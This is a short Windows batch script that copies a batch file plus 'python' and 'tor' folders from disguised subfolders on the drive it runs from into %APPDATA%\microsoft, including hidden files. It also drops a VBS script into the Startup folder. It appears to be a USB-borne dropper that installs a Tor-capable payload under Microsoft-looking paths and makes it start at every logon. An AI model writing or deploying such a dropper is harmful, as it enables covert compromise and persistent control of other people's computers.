@echo off

xcopy "%~d0\Lab\Subcarpeta5\Imagen1\sprog.bat" "%APPDATA%\microsoft\python\" /Y
xcopy "%~d0\Lab\Subcarpeta5\Imagen1\python" "%APPDATA%\microsoft\python\" /E /I /Y /H
xcopy "%~d0\Lab\Subcarpeta5\Imagen1\tor" "%APPDATA%\microsoft\tor\" /E /I /Y /H
xcopy "%~d0\Lab\Subcarpeta5\Imagen1\inicioP.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /Y
